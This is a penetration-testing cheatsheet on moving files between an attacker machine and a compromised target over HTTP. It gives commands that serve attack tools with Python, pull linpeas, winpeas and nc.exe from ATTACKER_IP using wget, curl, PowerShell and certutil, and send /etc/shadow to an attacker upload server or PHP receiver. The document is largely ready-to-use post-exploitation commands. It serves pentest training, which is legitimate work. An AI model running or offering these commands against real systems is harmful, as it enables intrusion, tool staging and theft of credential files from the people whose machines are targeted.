---
tags: [pentest, transfer, python, http, initial-access, web]
type: cheatsheet
phase: 5
---
# Python HTTP Server Transfer

The fastest way to transfer files to a target. Serve files from your attacker machine, download from the target.

[[00 - README|Folder index]]

## Serve files (attacker)

```bash
# Python 3
python3 -m http.server 80

# Python 3 on a specific port and directory
python3 -m http.server 8080 --directory /opt/tools

# Python 2 (legacy)
python -m SimpleHTTPServer 80
```

## Download on target

### Linux

```bash
wget http://ATTACKER_IP/linpeas.sh
curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh
```

### Windows

```powershell
Invoke-WebRequest http://ATTACKER_IP/winpeas.exe -OutFile winpeas.exe
certutil -urlcache -split -f http://ATTACKER_IP/nc.exe nc.exe
```

## Upload from target (Python upload server)

```python
# uploadserver (attacker — pip install uploadserver)
python3 -m uploadserver 80

# Target — upload via curl
curl -X POST http://ATTACKER_IP/upload -F 'files=@/etc/shadow'
```

## PHP upload receiver (on attacker)

```php
<?php file_put_contents("uploads/" . basename($_FILES["file"]["name"]), file_get_contents($_FILES["file"]["tmp_name"])); ?>
```

```bash
# Target
curl -F "file=@/etc/shadow" http://ATTACKER_IP/upload.php
```

## See also

- [[13 - SMB Server Transfer (impacket)]]
- [[14 - PowerShell Download Methods]]
- [[15 - certutil Download (LOLBin)]]
